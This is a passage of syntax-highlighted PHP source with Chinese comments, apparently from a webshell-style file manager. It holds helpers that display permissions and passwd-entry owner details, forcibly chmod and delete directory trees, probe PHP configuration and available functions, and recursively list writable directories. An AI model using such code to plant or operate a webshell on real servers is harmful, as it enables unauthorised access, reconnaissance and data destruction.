<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (($<span style="color: #f0c674;">mode</span> &amp; <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>xC000) === <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>xC000) {$<span style="color: #f0c674;">type</span> = <span style="color: #8abeb7;">'s'</span>;}
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">elseif</span> (($<span style="color: #f0c674;">mode</span> &amp; <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>x4000) === <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>x4000) {$<span style="color: #f0c674;">type</span> = <span style="color: #8abeb7;">'d'</span>;}
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">elseif</span> (($<span style="color: #f0c674;">mode</span> &amp; <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>xA000) === <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>xA000) {$<span style="color: #f0c674;">type</span> = <span style="color: #8abeb7;">'l'</span>;}
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">elseif</span> (($<span style="color: #f0c674;">mode</span> &amp; <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>x8000) === <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>x8000) {$<span style="color: #f0c674;">type</span> = <span style="color: #8abeb7;">'-'</span>;}<span style="color: #cc6666; background-color: #373b41;"> </span>
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">elseif</span> (($<span style="color: #f0c674;">mode</span> &amp; <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>x6000) === <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>x6000) {$<span style="color: #f0c674;">type</span> = <span style="color: #8abeb7;">'b'</span>;}
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">elseif</span> (($<span style="color: #f0c674;">mode</span> &amp; <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>x2000) === <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>x2000) {$<span style="color: #f0c674;">type</span> = <span style="color: #8abeb7;">'c'</span>;}
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">elseif</span> (($<span style="color: #f0c674;">mode</span> &amp; <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>x1000) === <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>x1000) {$<span style="color: #f0c674;">type</span> = <span style="color: #8abeb7;">'p'</span>;}
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">else</span> {$<span style="color: #f0c674;">type</span> = <span style="color: #8abeb7;">'?'</span>;}

<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">owner</span>[<span style="color: #8abeb7;">'read'</span>] = ($<span style="color: #f0c674;">mode</span> &amp; <span style="color: #c5c8c6; background-color: #1d1f21;">00400</span>) ? <span style="color: #8abeb7;">'r'</span> : <span style="color: #8abeb7;">'-'</span>;<span style="color: #cc6666; background-color: #373b41;"> </span>
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">owner</span>[<span style="color: #8abeb7;">'write'</span>] = ($<span style="color: #f0c674;">mode</span> &amp; <span style="color: #c5c8c6; background-color: #1d1f21;">00200</span>) ? <span style="color: #8abeb7;">'w'</span> : <span style="color: #8abeb7;">'-'</span>;<span style="color: #cc6666; background-color: #373b41;"> </span>
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">owner</span>[<span style="color: #8abeb7;">'execute'</span>] = ($<span style="color: #f0c674;">mode</span> &amp; <span style="color: #c5c8c6; background-color: #1d1f21;">00100</span>) ? <span style="color: #8abeb7;">'x'</span> : <span style="color: #8abeb7;">'-'</span>;<span style="color: #cc6666; background-color: #373b41;"> </span>
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">group</span>[<span style="color: #8abeb7;">'read'</span>] = ($<span style="color: #f0c674;">mode</span> &amp; <span style="color: #c5c8c6; background-color: #1d1f21;">00040</span>) ? <span style="color: #8abeb7;">'r'</span> : <span style="color: #8abeb7;">'-'</span>;<span style="color: #cc6666; background-color: #373b41;"> </span>
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">group</span>[<span style="color: #8abeb7;">'write'</span>] = ($<span style="color: #f0c674;">mode</span> &amp; <span style="color: #c5c8c6; background-color: #1d1f21;">00020</span>) ? <span style="color: #8abeb7;">'w'</span> : <span style="color: #8abeb7;">'-'</span>;<span style="color: #cc6666; background-color: #373b41;"> </span>
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">group</span>[<span style="color: #8abeb7;">'execute'</span>] = ($<span style="color: #f0c674;">mode</span> &amp; <span style="color: #c5c8c6; background-color: #1d1f21;">00010</span>) ? <span style="color: #8abeb7;">'x'</span> : <span style="color: #8abeb7;">'-'</span>;<span style="color: #cc6666; background-color: #373b41;"> </span>
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">world</span>[<span style="color: #8abeb7;">'read'</span>] = ($<span style="color: #f0c674;">mode</span> &amp; <span style="color: #c5c8c6; background-color: #1d1f21;">00004</span>) ? <span style="color: #8abeb7;">'r'</span> : <span style="color: #8abeb7;">'-'</span>;<span style="color: #cc6666; background-color: #373b41;"> </span>
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">world</span>[<span style="color: #8abeb7;">'write'</span>] = ($<span style="color: #f0c674;">mode</span> &amp; <span style="color: #c5c8c6; background-color: #1d1f21;">00002</span>) ? <span style="color: #8abeb7;">'w'</span> : <span style="color: #8abeb7;">'-'</span>;<span style="color: #cc6666; background-color: #373b41;"> </span>
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">world</span>[<span style="color: #8abeb7;">'execute'</span>] = ($<span style="color: #f0c674;">mode</span> &amp; <span style="color: #c5c8c6; background-color: #1d1f21;">00001</span>) ? <span style="color: #8abeb7;">'x'</span> : <span style="color: #8abeb7;">'-'</span>;<span style="color: #cc6666; background-color: #373b41;"> </span>

<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>( $<span style="color: #f0c674;">mode</span> &amp; <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>x800 ) {$<span style="color: #f0c674;">owner</span>[<span style="color: #8abeb7;">'execute'</span>] = ($<span style="color: #f0c674;">owner</span>[<span style="color: #8abeb7;">'execute'</span>]==<span style="color: #8abeb7;">'x'</span>) ? <span style="color: #8abeb7;">'s'</span> : <span style="color: #8abeb7;">'S</span><span style="color: #8abeb7; text-decoration: underline;">'</span><span style="text-decoration: underline;">;}</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>( $<span style="color: #f0c674;">mode</span> &amp; <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>x400 ) {$<span style="color: #f0c674;">group</span>[<span style="color: #8abeb7;">'execute'</span>] = ($<span style="color: #f0c674;">group</span>[<span style="color: #8abeb7;">'execute'</span>]==<span style="color: #8abeb7;">'x'</span>) ? <span style="color: #8abeb7;">'s'</span> : <span style="color: #8abeb7;">'S</span><span style="color: #8abeb7; text-decoration: underline;">'</span><span style="text-decoration: underline;">;}</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>( $<span style="color: #f0c674;">mode</span> &amp; <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>x200 ) {$<span style="color: #f0c674;">world</span>[<span style="color: #8abeb7;">'execute'</span>] = ($<span style="color: #f0c674;">world</span>[<span style="color: #8abeb7;">'execute'</span>]==<span style="color: #8abeb7;">'x'</span>) ? <span style="color: #8abeb7;">'t'</span> : <span style="color: #8abeb7;">'T</span><span style="color: #8abeb7; text-decoration: underline;">'</span><span style="text-decoration: underline;">;}</span>

<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> $<span style="color: #f0c674;">type</span><span style="color: #cc6666; font-weight: bold;">.</span>$<span style="color: #f0c674;">owner</span>[<span style="color: #8abeb7;">'read'</span>].$<span style="color: #f0c674;">owner</span>[<span style="color: #8abeb7;">'write'</span>].$<span style="color: #f0c674;">owner</span>[<span style="color: #8abeb7;">'execute'</span>].$<span style="color: #f0c674;">group</span>[<span style="color: #8abeb7;">'read'</span>]<span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">group</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'write'</span><span style="text-decoration: underline;">].$</span><span style="color: #f0c674; text-decoration: underline;">group</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'execute'</span><span style="text-decoration: underline;">].$</span><span style="color: #f0c674; text-decoration: underline;">world</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'read'</span><span style="text-decoration: underline;">].$</span><span style="color: #f0c674; text-decoration: underline;">world</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'write'</span><span style="text-decoration: underline;">].$</span><span style="color: #f0c674; text-decoration: underline;">world</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'execute'</span><span style="text-decoration: underline;">];</span>
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">getUser</span>($<span style="color: #f0c674;">filepath</span>)     {
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">function_exists(</span><span style="color: #8abeb7;">'posix_getpwuid'</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">array</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">posix_getpwuid(</span>@<span style="color: #c5c8c6; background-color: #1d1f21;">fileowner(</span>$<span style="color: #f0c674;">filepath</span>));
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">array</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">is_array(</span>$<span style="color: #f0c674;">array</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #8abeb7;">' / &lt;a href="#" title="User: '</span>.$<span style="color: #f0c674;">array</span>[<span style="color: #8abeb7;">'name'</span>].<span style="color: #8abeb7;">'&amp;#13&amp;#10Passwd</span><span style="color: #8abeb7; text-decoration: underline;">: '</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'passwd'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'&amp;#13&amp;#10Uid: '</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'uid'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'&amp;#13&amp;#10gid: '</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'gid'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'&amp;#13&amp;#10Gecos: '</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'gecos'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'&amp;#13&amp;#10Dir: '</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'dir'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'&amp;#13&amp;#10Shell: '</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'shell'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'name'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'&lt;/a&gt;'</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #8abeb7;">''</span>;
}

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#21024;&#38500;&#30446;&#24405;</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">deltree</span>($<span style="color: #f0c674;">deldir</span>) {
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">mydir</span>=<span style="color: #b5bd68;">@dir</span>($<span style="color: #f0c674;">deldir</span>);<span style="color: #cc6666; background-color: #373b41;">   </span>
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">while</span>($<span style="color: #f0c674;">file</span>=$<span style="color: #f0c674;">mydir</span>-&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">read</span>())     {<span style="color: #cc6666; background-color: #373b41;">       </span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>((<span style="color: #c5c8c6; background-color: #1d1f21;">is_dir(</span>$<span style="color: #f0c674;">deldir</span>.<span style="color: #8abeb7;">'/'</span>.$<span style="color: #f0c674;">file</span>)) &amp;&amp; ($<span style="color: #f0c674;">file</span>!=<span style="color: #8abeb7;">'.'</span>) &amp;&amp; ($<span style="color: #f0c674;">file</span>!=<span style="color: #8abeb7;">'..'</span>)) {<span style="color: #cc6666; background-color: #373b41;"> </span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   @<span style="color: #c5c8c6; background-color: #1d1f21;">chmod(</span>$<span style="color: #f0c674;">deldir</span>.<span style="color: #8abeb7;">'/'</span>.$<span style="color: #f0c674;">file</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">0777</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">deltree(</span>$<span style="color: #f0c674;">deldir</span>.<span style="color: #8abeb7;">'/'</span>.$<span style="color: #f0c674;">file</span>);<span style="color: #cc6666; background-color: #373b41;"> </span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">is_file(</span>$<span style="color: #f0c674;">deldir</span>.<span style="color: #8abeb7;">'/'</span>.$<span style="color: #f0c674;">file</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   @<span style="color: #c5c8c6; background-color: #1d1f21;">chmod(</span>$<span style="color: #f0c674;">deldir</span>.<span style="color: #8abeb7;">'/'</span>.$<span style="color: #f0c674;">file</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">0777</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   @<span style="color: #c5c8c6; background-color: #1d1f21;">unlink(</span>$<span style="color: #f0c674;">deldir</span>.<span style="color: #8abeb7;">'/'</span>.$<span style="color: #f0c674;">file</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   }<span style="color: #cc6666; background-color: #373b41;"> </span>
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">mydir</span>-&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">close</span>();<span style="color: #cc6666; background-color: #373b41;"> </span>
<span style="background-color: #373b41;"> </span>   @<span style="color: #c5c8c6; background-color: #1d1f21;">chmod(</span>$<span style="color: #f0c674;">deldir</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">0777</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> @<span style="color: #c5c8c6; background-color: #1d1f21;">rmdir(</span>$<span style="color: #f0c674;">deldir</span>) ? <span style="color: #c5c8c6; background-color: #1d1f21;">1</span> : <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>;
}

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#34920;&#26684;&#34892;&#38388;&#30340;&#32972;&#26223;&#33394;&#26367;&#25442;</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">bg</span>() {
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">global</span> $<span style="color: #f0c674;">bgc</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> ($<span style="color: #f0c674;">bgc</span>++%<span style="color: #c5c8c6; background-color: #1d1f21;">2</span>==<span style="color: #c5c8c6; background-color: #1d1f21;">0</span>) ? <span style="color: #8abeb7;">'alt1'</span> : <span style="color: #8abeb7;">'alt2'</span>;
}

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#33719;&#21462;&#24403;&#21069;&#30340;&#25991;&#20214;&#31995;&#32479;&#36335;&#24452;</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">getPath</span>($<span style="color: #f0c674;">scriptpath</span>, $<span style="color: #f0c674;">nowpath</span>) {
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">nowpath</span> == <span style="color: #8abeb7;">'.'</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">nowpath</span> = $<span style="color: #f0c674;">scriptpath</span>;
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">nowpath</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">str_replace(</span><span style="color: #8abeb7;">'\\'</span>, <span style="color: #8abeb7;">'/'</span>, $<span style="color: #f0c674;">nowpath</span>);
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">nowpath</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">str_replace(</span><span style="color: #8abeb7;">'//'</span>, <span style="color: #8abeb7;">'/'</span>, $<span style="color: #f0c674;">nowpath</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">substr(</span>$<span style="color: #f0c674;">nowpath</span>, -<span style="color: #c5c8c6; background-color: #1d1f21;">1</span>) != <span style="color: #8abeb7;">'/'</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">nowpath</span> = $<span style="color: #f0c674;">nowpath</span>.<span style="color: #8abeb7;">'/'</span>;
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> $<span style="color: #f0c674;">nowpath</span>;
}

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#33719;&#21462;&#24403;&#21069;&#30446;&#24405;&#30340;&#19978;&#32423;&#30446;&#24405;</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">getUpPath</span>($<span style="color: #f0c674;">nowpath</span>) {
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">pathdb</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">explode(</span><span style="color: #8abeb7;">'/'</span>, $<span style="color: #f0c674;">nowpath</span>);
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">num</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">count(</span>$<span style="color: #f0c674;">pathdb</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">num</span> &gt; <span style="color: #c5c8c6; background-color: #1d1f21;">2</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">unset(</span>$<span style="color: #f0c674;">pathdb</span>[$<span style="color: #f0c674;">num</span>-<span style="color: #c5c8c6; background-color: #1d1f21;">1</span>],$<span style="color: #f0c674;">pathdb</span>[$<span style="color: #f0c674;">num</span>-<span style="color: #c5c8c6; background-color: #1d1f21;">2</span>]);
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">uppath</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">implode(</span><span style="color: #8abeb7;">'/'</span>, $<span style="color: #f0c674;">pathdb</span>).<span style="color: #8abeb7;">'/'</span>;
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">uppath</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">str_replace(</span><span style="color: #8abeb7;">'//'</span>, <span style="color: #8abeb7;">'/'</span>, $<span style="color: #f0c674;">uppath</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> $<span style="color: #f0c674;">uppath</span>;
}

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#26816;&#26597;PHP&#37197;&#32622;&#21442;&#25968;</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">getcfg</span>($<span style="color: #f0c674;">varname</span>) {
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">result</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">get_cfg_var(</span>$<span style="color: #f0c674;">varname</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">result</span> == <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #8abeb7;">'No'</span>;
<span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">elseif</span> ($<span style="color: #f0c674;">result</span> == <span style="color: #c5c8c6; background-color: #1d1f21;">1</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #8abeb7;">'Yes'</span>;
<span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> $<span style="color: #f0c674;">result</span>;
<span style="background-color: #373b41;"> </span>   }
}

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#26816;&#26597;&#20989;&#25968;&#24773;&#20917;</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">getfun</span>($<span style="color: #f0c674;">funName</span>) {
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> (<span style="color: #81a2be;">false</span> !== <span style="color: #c5c8c6; background-color: #1d1f21;">function_exists(</span>$<span style="color: #f0c674;">funName</span>)) ? <span style="color: #8abeb7;">'Yes'</span> : <span style="color: #8abeb7;">'No'</span>;
}

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#33719;&#24471;&#25991;&#20214;&#25193;&#23637;&#21517;</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">getext</span>($<span style="color: #f0c674;">file</span>) {
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">info</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">pathinfo(</span>$<span style="color: #f0c674;">file</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> $<span style="color: #f0c674;">info</span>[<span style="color: #8abeb7;">'extension'</span>];
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">GetWDirList</span>($<span style="color: #f0c674;">dir</span>){
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">global</span> $<span style="color: #f0c674;">dirdata</span>,$<span style="color: #f0c674;">j</span>,$<span style="color: #f0c674;">nowpath</span>;
<span style="background-color: #373b41;"> </span>   !$<span style="color: #f0c674;">j</span> &amp;&amp; $<span style="color: #f0c674;">j</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">1</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">dh</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">opendir(</span>$<span style="color: #f0c674;">dir</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">while</span> ($<span style="color: #f0c674;">file</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">readdir(</span>$<span style="color: #f0c674;">dh</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">f</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">str_replace(</span><span style="color: #8abeb7;">'//'</span>,<span style="color: #8abeb7;">'/'</span>,$<span style="color: #f0c674;">dir</span>.<span style="color: #8abeb7;">'/'</span>.$<span style="color: #f0c674;">file</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>($<span style="color: #f0c674;">file</span>!=<span style="color: #8abeb7;">'.'</span> &amp;&amp; $<span style="color: #f0c674;">file</span>!=<span style="color: #8abeb7;">'..'</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">is_dir(</span>$<span style="color: #f0c674;">f</span>)){
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">is_writable(</span>$<span style="color: #f0c674;">f</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">dirdata</span>[$<span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'filename'</span>]=<span style="color: #c5c8c6; background-color: #1d1f21;">str_replace(</span>$<span style="color: #f0c674;">nowpath</span>,<span style="color: #8abeb7;">''</span>,$<span style="color: #f0c674;">f</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">dirdata</span>[$<span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'mtime'</span>]=<span style="color: #b5bd68;">@date</span>(<span style="color: #8abeb7;">'Y-m-d H:i:s'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">filemtime(</span>$<span style="color: #f0c674;">f</span>));
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">dirdata</span>[$<span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'dirchmod'</span>]=<span style="color: #c5c8c6; background-color: #1d1f21;">getChmod(</span>$<span style="color: #f0c674;">f</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">dirdata</span>[$<span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'dirperm'</span>]=<span style="color: #c5c8c6; background-color: #1d1f21;">getPerms(</span>$<span style="color: #f0c674;">f</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">dirdata</span>[$<span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'dirlink'</span>]=$<span style="color: #f0c674;">dir</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">dirdata</span>[$<span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'server_link'</span>]=$<span style="color: #f0c674;">f</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">j</span>++;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">GetWDirList(</span>$<span style="color: #f0c674;">f</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
